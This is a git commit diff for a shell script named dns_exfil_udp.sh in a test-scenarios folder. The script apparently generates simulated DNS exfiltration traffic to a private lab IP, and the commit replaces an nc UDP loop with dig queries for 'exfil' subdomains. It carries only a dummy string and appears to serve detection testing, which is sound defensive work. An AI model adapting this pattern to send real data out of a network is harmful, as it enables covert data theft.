d3bcb7123bbdd4b2fcbd53e341baaba0542256c4
lixt28 <148846244+lixt28@users.noreply.github.com>
2025-10-19 18:01:48 -0400

    Update dns_exfil_udp.sh

--- scripts/test_scenarios/dns_exfil_udp.sh
+++ scripts/test_scenarios/dns_exfil_udp.sh
@@ -1,6 +1,2 @@
 #!/usr/bin/env bash
-TARGET=${1:-192.168.1.2}
-for i in {1..5}; do
-  printf 'exfil' | nc -u -w1 "$TARGET" 53
-  sleep 0.2
-done
+for i in {1..5}; do dig exfil$i.test @192.168.1.2; done
